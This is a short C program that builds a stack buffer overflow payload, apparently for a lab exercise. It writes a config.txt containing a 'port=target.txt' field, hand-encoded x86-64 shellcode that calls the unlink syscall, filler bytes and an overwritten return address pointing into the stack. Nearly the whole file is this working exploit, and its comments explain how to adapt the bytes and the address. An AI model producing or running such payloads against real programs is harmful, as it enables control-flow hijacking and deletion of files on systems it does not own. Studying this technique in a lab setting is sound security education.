#include <string.h>
#include <stdlib.h>
#include <stdio.h>


int main(int argc, char *argv[]) {
  //put the instruction hex number in the buf array.
  char buf[] = {0x48, 0xc7 ,0xc0 ,0x57, 0x00,0x00,0x00,0x48,0x8d,0xbc,0x24,0x65,0xff,0xff,0xff,0x0f,0x05};
  //put the 8 byte return address in reverse order into address array.
  char address[8] = {0x10,0xd0,0xff,0xff,0xff,0x7f,0x0,0x0};
  
  //the rest you don't care, it will output config.txt
  int buflen = sizeof(buf),portlen = 5,tarlen = strlen("target.txt")+1;
  char* mem = malloc(160);
  memcpy(mem,"port=",portlen);
  memcpy(mem+portlen,"target.txt",tarlen);
  memcpy(mem+portlen+tarlen,buf,buflen);
  char as[152-(portlen+buflen+tarlen)];
  //fill the rest with character 'a', you can change to others
  memset(as,'a',152-(portlen+buflen+tarlen));
  memcpy(mem+portlen+buflen+tarlen,as,152-(portlen+buflen+tarlen));
  memcpy(mem+152,address,8);
  FILE* fp = fopen("config.txt","w");
  fwrite(mem,sizeof(char),160,fp);
  fclose(fp);
  free(mem);
}